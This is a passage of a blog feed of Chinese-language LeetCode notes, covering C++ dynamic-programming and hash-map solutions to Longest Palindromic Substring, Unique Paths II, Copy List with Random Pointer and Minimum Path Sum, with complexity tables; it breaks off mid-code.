函數中也變更了透過 <code>reverse</code> 的檢查方式，這裡進行手動檢查，如果 <code>dp[left][right]</code> 存在就回傳計算結果，只要 <code>left &lt; right</code> 那在迴圈內只要兩端對應位置的字元不相等 (<code>s[left] != s[right]</code>) 則  <code>dp[left][right]=false</code> ，如果迴圈順利執行完成則代表為回文子字串，回傳 <code>dp[left][right]=true</code></p><p>在主函數 <code>longestPalindrome</code> 初始化 <code>dp</code> 為大小為 <code>n*n</code> 的二維陣列，值為 <code>-1</code>，接著在二維陣列中，將外層迴圈作為子字串起點，內層迴圈從該起點 <code>start</code> 來去迭代字字串範圍，並且依序檢查是否為回文子字串，如果是，則檢查子字串長度是否大於 <code>maxStr</code> 的長度，如果大於則更新 <code>maxStr</code> 為該子字串。 迴圈結束後回傳 <code>maxStr</code></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/5/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h3 id="時間複雜度比較"><a href="#時間複雜度比較" class="headerlink" title="時間複雜度比較"></a>時間複雜度比較</h3><table><thead><tr><th>方法</th><th>時間複雜度</th><th>分析過程說明</th></tr></thead><tbody><tr><td><strong>Recursion</strong></td><td>$O(n^3)$</td><td>外層遞迴執行 $O(n)$，內層迴圈執行 $O(n^2)$ 次子字串遍歷，每次遍歷中執行 checkPalindrome，最壞情況為  $O(n)$，因此整體府雜度會是 $O(n^3)$</td></tr><tr><td><strong>Iteration + Memoization</strong></td><td>$O(n^2)$</td><td>對於每個可能的子字串（總共有約 $n^2&#x2F;2$ 個），我們檢查是否為回文並記錄結果，保證每個子字串只檢查一次，因此時間複雜度為二次方成長</td></tr></tbody></table><h3 id="空間複雜度比較"><a href="#空間複雜度比較" class="headerlink" title="空間複雜度比較"></a>空間複雜度比較</h3><table><thead><tr><th>方法</th><th>空間複雜度</th><th>分析過程說明</th></tr></thead><tbody><tr><td><strong>Recursion</strong></td><td>$O(n)$</td><td>每層遞迴函數調用會佔用額外的棧空間，最多同時有 $n$ 層調用，因此空間複雜度為 $O(n)$</td></tr><tr><td><strong>Iteration + Memoization</strong></td><td>$O(n^2)$</td><td>建立一個二維 <code>dp</code> 表（大小為 $n \times n$)，用來存儲每個子字串的回文性質，額外的空間開銷來自這個表</td></tr></tbody></table><h1 id="類似題目"><a href="#類似題目" class="headerlink" title="類似題目"></a>類似題目</h1><p>對於回文類型的題目有很多類似的，像是 <a href="https://leetcode.com/problems/longest-palindromic-substring/description/?envType=study-plan-v2&envId=top-interview-150">647. Palindromic Substrings</a> 這題感覺像是本題的前身，另外就是 Backtracking 的題目 <a href="https://leetcode.com/problems/palindrome-partitioning/description/">131. Palindrome Partitioning</a> 都其實可以用到 DP這種最佳化的方式去解。</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Multidimensional DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>特殊路徑II | Medium | LeetCode#63. Unique Paths II</title>
      <link href="/posts/12e1c70b.html"/>
      <url>/posts/12e1c70b.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/63/question1.jpeg"></p><p><img src="/img/LeetCode/63/question2.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目描述： 給定一個 <code>m x n</code> 大小的整數2D陣列 <code>grid</code>，有個機器人為位在網格最左上角 (<code>grid[0][0]</code>)，機器人想要移動到最右下角 (<code>grid[m-1][n-1]</code>)。機器人每次可以選擇往下或是往右邊移動。網格中某些格子有障礙物，有障礙物的那格會被標注 <code>1</code>，如果沒有障礙物則是標注 <code>0</code>，機器人移動的路線中不能包含任何障礙物。 題目要求回傳機器人可以走的所有唯一的路徑數量。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始的想法一樣還是要找子問題，從左上角起點每次可以選擇往右或往下，而終點會是陣列中 <code>[m-1][n-1]</code> 的位置，最短路徑和可以從終點加上他的上面或左邊那格一路回朔回起點， <strong>因此這會是一個大量重疊的子問題，因此可以用 DP 中的 Recursion + Memoization 來解決。</strong></p><h2 id="我的解法-Recursion-Memoization"><a href="#我的解法-Recursion-Memoization" class="headerlink" title="我的解法 - Recursion + Memoization"></a>我的解法 - Recursion + Memoization</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dp;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">helper</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; obstaclesGrid, <span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> m = obstaclesGrid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = obstaclesGrid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(x &gt;= m || y &gt;= n || obstaclesGrid[x][y] ==  <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(x == m<span class="number">-1</span> &amp;&amp; y == n<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(dp[x][y] != INT_MIN) <span class="keyword">return</span> dp[x][y];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Move to the next square</span></span><br><span class="line">        <span class="type">int</span> r1 = <span class="built_in">helper</span>(obstaclesGrid, x+<span class="number">1</span>, y);</span><br><span class="line">        <span class="type">int</span> r2 = <span class="built_in">helper</span>(obstaclesGrid, x, y+<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        dp[x][y] = r1+r2;</span><br><span class="line">        <span class="keyword">return</span> dp[x][y];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">uniquePathsWithObstacles</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; obstacleGrid)</span></span>&#123;</span><br><span class="line">        dp = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(obstacleGrid.<span class="built_in">size</span>(), <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(obstacleGrid[<span class="number">0</span>].<span class="built_in">size</span>(), INT_MIN));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(obstacleGrid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>主要程式邏輯會是在 <code>helper</code> 裏面，參數 <code>x</code> 和 <code>y</code> 是用於紀錄當前是表格中哪一行哪一列。在函數中首先定義了 base case，如果到達最右下角的那格，就回傳 <code>1</code> 代表這一是一條有效的路徑。 另外當 <code>x</code> 或者 <code>y</code> 加超過了陣列範圍或者是遇到障礙物 <code>obstaclesGrid[x][y] ==  1</code> 則返回 <code>0</code>，代表是無效路徑。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> r1 = <span class="built_in">helper</span>(obstaclesGrid, x+<span class="number">1</span>, y);</span><br><span class="line"><span class="type">int</span> r2 = <span class="built_in">helper</span>(obstaclesGrid, x, y+<span class="number">1</span>);</span><br><span class="line">dp[x][y] = r1+r2;</span><br><span class="line"><span class="keyword">return</span> dp[x][y];</span><br></pre></td></tr></table></figure><p>接著上面這段代表，每一格中都可以選擇往右(<code>y+1</code>)或往下(<code>x+1</code>)走， <strong>但不管哪一種走法，其加總就會是當前為止有的有效路徑數量</strong> ，然後記錄到用於紀錄重複計算的 <code>dp</code> 中，最後回傳 <code>dp[x][y]</code>。在函數 <code>uniquePathsWithObstacles</code> 先初始化了 <code>dp</code> 為 <code>m x n</code> 大小的二維陣列，其初始值為 <code>INT_MAX</code>。在 <code>helper</code> 中如果 <code>dp[i][j]</code> 不為 <code>INT_MAX</code> 就代表已經計算過了，就直接回傳對應值即可。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/63/result.jpeg"></p><h2 id="Iteration"><a href="#Iteration" class="headerlink" title="Iteration"></a>Iteration</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">uniquePathsWithObstacles</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; obstacleGrid)</span></span>&#123;</span><br><span class="line">        <span class="type">int</span> m = obstacleGrid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = obstacleGrid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">0</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(obstacleGrid[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span>)dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> dp[<span class="number">0</span>][<span class="number">0</span>] =<span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;m; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(obstacleGrid[i][<span class="number">0</span>] == <span class="number">0</span> &amp;&amp; dp[i<span class="number">-1</span>][<span class="number">0</span>] == <span class="number">1</span>)dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> dp[i][<span class="number">0</span>] =<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;n; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(obstacleGrid[<span class="number">0</span>][j] == <span class="number">0</span> &amp;&amp; dp[<span class="number">0</span>][j<span class="number">-1</span>]==<span class="number">1</span>) dp[<span class="number">0</span>][j] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> dp[<span class="number">0</span>][j] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;m;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>; j&lt;n; j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(obstacleGrid[i][j]== <span class="number">0</span>)&#123;</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j] + dp[i][j<span class="number">-1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m<span class="number">-1</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Iteration 的做法就是反向操作， <strong>每一格的有效路徑是由其上方或左邊那格的路徑數量以及當前是否有障礙來決定的。</strong> 而對於做左側那行中的每一格只會來自他的上面，而對於在最下面那列的所有格中，只會來自於他的左側，因此透過兩個迴圈來處理這兩種狀況，最後就是透過雙重迴圈來去迭代每一個進行有效路徑的加總。 而 Iteration 的初始化，則是將 <code>dp</code> 都初始化為 <code>0</code>，默認為無效路徑 (每一格路徑總數為<code>0</code>)。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(obstacleGrid[i][<span class="number">0</span>] == <span class="number">0</span> &amp;&amp; dp[i<span class="number">-1</span>][<span class="number">0</span>] == <span class="number">1</span>)dp[i][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> dp[i][<span class="number">0</span>] =<span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>如果當前無障礙物，並且當前格子上面的格子有有效路徑，則當前格子也會是有效路徑 <code>dp[i][0]=1</code> 否則為 <code>dp[i][0]=0</code>。對於相同行也一樣，如果當前無障礙物，並且當前格子上面的格子有有效路徑，則當前格子也會是有效路徑 <code>dp[0][j]=1</code> 否則為 <code>dp[0][j]=0</code>，最後透過雙重迴圈來迭代進行路徑數量加總。迭代到最右下角那格， <strong>則代表從最左上角起點加總到右下角終點的所有唯一的路徑總數。</strong></p><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/63/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><table><thead><tr><th>方法</th><th>時間複雜度</th><th>分析過程</th></tr></thead><tbody><tr><td>Recursion + Memoization</td><td>$O(m \times n)$</td><td>每個網格的狀態只會計算一次，因為使用了記憶化避免了重複計算，最多遍歷 $m \times n$ 個網格。</td></tr><tr><td>Iteration</td><td>$O(m \times n)$</td><td>動態規劃需要遍歷整個表格來填充 <code>dp</code>，因此最多也需要 $m \times n$ 次迭代</td></tr></tbody></table><table><thead><tr><th>方法</th><th>空間複雜度</th><th>分析過程</th></tr></thead><tbody><tr><td>Recursion + Memoization</td><td>$O(m \times n)$</td><td>使用了一個大小為 $m \times n$  的記憶化表格來存儲每個狀態的計算結果，並額外需要 $O(h)$ 的遞迴棧空間，其中 $h$ 是遞迴深度</td></tr><tr><td>Iteration</td><td>$O(m \times n)$</td><td>使用了一個大小為 $m \times n$  的 <code>dp</code> 表格來存儲中間結果，無需額外的遞迴空間</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Multidimensional DP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>複製有 Random 指標的鏈結串列 | Medium | LeetCode#138. Copy List with Random Pointer</title>
      <link href="/posts/28674f4b.html"/>
      <url>/posts/28674f4b.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/138/question.jpeg"></p><p><img src="/img/LeetCode/138/question2.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 給定長度為 <code>n</code> 的 Linked List，每個節點都有一個額外的指標 <code>random</code>，可以指向相同list中的任意節點，以及 <code>NULL</code>，題目要求建立這個 List 的 <strong><a href="https://en.wikipedia.org/wiki/Object_copying#Deep_copy">Deep Copy</a></strong></li></ul><div class="note info flat"><p>以下是節錄自維基百科對於 Deep Copy 的定義<br><em>Deep copy involves copying the state of all subordinate objects – recursively dereferencing object references at each level of the tree that is the state of the original object and creating new objects and copying fields. A modification of either the original or copied object, including their inner objects, does not affect the other since they share none of the content.</em></p></div><p>舉例來說如果今天有 A 跟 B 兩個節點，並且 <code>A.random -&gt; B</code> 那將他們進行複製後的節點 a 和 b 也會滿足 <code>a.random-&gt;b</code>， <strong>原則上就是新複製的 Linked List 它們的 <code>random</code> 指標都不能夠指向原來的 Linked List</strong></p><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="我的做法"><a href="#我的做法" class="headerlink" title="我的做法"></a>我的做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">// Definition for a Node.</span></span><br><span class="line"><span class="comment">class Node &#123;</span></span><br><span class="line"><span class="comment">public:</span></span><br><span class="line"><span class="comment">    int val;</span></span><br><span class="line"><span class="comment">    Node* next;</span></span><br><span class="line"><span class="comment">    Node* random;</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    Node(int _val) &#123;</span></span><br><span class="line"><span class="comment">        val = _val;</span></span><br><span class="line"><span class="comment">        next = NULL;</span></span><br><span class="line"><span class="comment">        random = NULL;</span></span><br><span class="line"><span class="comment">    &#125;   </span></span><br><span class="line"><span class="comment">&#125;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">Node* <span class="title">copyRandomList</span><span class="params">(Node* head)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!head) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        Node *ptr = head;</span><br><span class="line">        </span><br><span class="line">        unordered_map &lt;Node*, Node*&gt; randomMap;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(ptr != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            randomMap[ptr] = <span class="keyword">new</span> <span class="built_in">Node</span>(ptr-&gt;val);</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ptr = head;</span><br><span class="line">        <span class="keyword">while</span>(ptr != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            randomMap[ptr]-&gt;next = randomMap[ptr-&gt;next];</span><br><span class="line">            randomMap[ptr]-&gt;random = randomMap[ptr-&gt;random];</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> randomMap[head];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡宣告了一個 hash table <code>unordered_map &lt;Node*, Node*&gt;</code> 來分別儲存 原本 list 的節點指標跟複製後的 List 節點指標。 首先透過一個迴圈來迭代原本的list，並且依序將原本的節點位址指標 <code>ptr</code> 作為 key 而新建立的節點 <code>new Node(ptr-&gt;val)</code> 作為 value，並且在初始化時就給定與原節點相同的值 <code>ptr-&gt;val</code>。</p><p>建立完畢，則回到 <code>head</code> 並且一樣透過 <code>ptr</code> 去迭代剛剛建立的 hash table，去為新節點鏈結 <code>next</code> 以及 <code>random</code>指標</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">randomMap[ptr]-&gt;next = randomMap[ptr-&gt;next];</span><br><span class="line">randomMap[ptr]-&gt;random = randomMap[ptr-&gt;random];</span><br></pre></td></tr></table></figure><p><strong><code>randomMap[ptr]-&gt;next</code> 代表新節點的 <code>next</code> 會指向到 <code>randomMap[ptr-&gt;next]</code> 原節點的 <code>next</code> 所指的位址。而 <code>randomMap[ptr]-&gt;random</code> 新節點的 <code>random</code> 則會指向到原節點的 <code>random</code> 指向的位址。</strong></p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/138/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>$O(n)$ &#x3D; $O(n)$ + $O(n)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p><code>unordered_map</code> 會多儲存 $O(n)$ 大小的空間。其他變數佔用常數空間大小，因此整體空間複雜度會是 $O(n )$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最短路徑總和 | Medium | LeetCode#64. Minimum Path Sum</title>
      <link href="/posts/99b89edb.html"/>
      <url>/posts/99b89edb.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>這是第一次寫 Multidimensional DP 的時間小於 20 min 就 AC !! 值得紀念一下 ~</p></blockquote><h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/64/question.jpeg"></p><ul><li>題目難度：<code>Medium</code></li><li>題目描述： 題目給了一個 <code>m x n</code> 大小的二維整數陣列 <code>grid</code>，陣列中的值為非零整數，請找到從網格左上角走到右下角的最小路徑和， <strong>在每一格每次只能選擇往下或是往右邊走</strong></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>一開始的想法一樣還是要找子問題，從左上角起點每次可以選擇往右或往下，而終點會是陣列中 <code>[m-1][n-1]</code> 的位置，最短路徑和可以從終點加上他的上面或左邊那格一路回朔回起點， <strong>因此這會是一個大量重疊的子問題，因此可以用 DP 中的 Recursion + Memoization 來解決。</strong></p><h2 id="我的解法-Recursion-Memoization"><a href="#我的解法-Recursion-Memoization" class="headerlink" title="我的解法 - Recursion + Memoization"></a>我的解法 - Recursion + Memoization</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; dp;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">helper</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, <span class="type">int</span> i, <span class="type">int</span> j)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= grid.<span class="built_in">size</span>() || j &gt;= grid[<span class="number">0</span>].<span class="built_in">size</span>()) <span class="keyword">return</span> INT_MAX;</span><br><span class="line">        <span class="keyword">if</span>(i==grid.<span class="built_in">size</span>()<span class="number">-1</span> &amp;&amp; j==grid[<span class="number">0</span>].<span class="built_in">size</span>()<span class="number">-1</span>) <span class="keyword">return</span> grid[i][j];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(dp[i][j]!=INT_MAX) <span class="keyword">return</span> dp[i][j];</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> r1 = <span class="built_in">helper</span>(grid,i+<span class="number">1</span>,j);</span><br><span class="line">        <span class="type">int</span> r2 = <span class="built_in">helper</span>(grid,i,j+<span class="number">1</span>);</span><br><span class="line">        dp[i][j] = grid[i][j] + <span class="built_in">min</span>(r1, r2);</span><br><span class="line">        <span class="keyword">return</span> dp[i][j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minPathSum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span></span>&#123;</span><br><span class="line">        dp = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(grid.<span class="built_in">size</span>(), <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(grid[<span class="number">0</span>].<span class="built_in">size</span>(), INT_MAX));</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">helper</span>(grid,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>主要程式邏輯會是在 <code>helper</code> 裏面，參數 <code>i</code> 和 <code>j</code> 是用於紀錄當前是表格中哪一行哪一列。在函數中首先定義了 base case，如果到達最右下角的那格，就直接回傳終點值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> r1 = <span class="built_in">helper</span>(grid,i+<span class="number">1</span>,j);</span><br><span class="line"><span class="type">int</span> r2 = <span class="built_in">helper</span>(grid,i,j+<span class="number">1</span>);</span><br><span class="line">dp[i][j] = grid[i][j] + <span class="built_in">min</span>(r1, r2);</span><br><span class="line"><span class="keyword">return</span> dp[i][j];</span><br></pre></td></tr></table></figure><p>接著上面這段代表，每一格中都可以選擇往右(<code>j+1</code>)或往下(<code>i+1</code>)走，但不管哪一種走法，回傳回來的結果選最小的就對了，並且需要加上當前這格的值，然後記錄到用於紀錄重複計算的 <code>dp</code> 中，最後回傳 <code>dp[i][j]</code>。在函數 <code>minPathSum</code> 先初始化了 <code>dp</code> 為 <code>m x n</code> 大小的二維陣列，其初始值為 <code>INT_MAX</code>。在 <code>helper</code> 中如果 <code>dp[i][j]</code> 不為 <code>INT_MAX</code> 就代表已經計算過了，就直接回傳對應值即可。</p><p>另外在 <code>helper</code> 中還需要額外做邊界檢查，因為 <code>i</code>, <code>j</code> 會有可能存取超出邊界．只要發現超出邊界就回傳 <code>INT_MAX</code>。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/64/result.jpeg"></p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">minPathSum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">    <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n , grid[<span class="number">0</span>][<span class="number">0</span>]));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;m; i++)&#123;</span><br><span class="line">        dp[i][<span class="number">0</span>] = dp[i<span class="number">-1</span>][<span 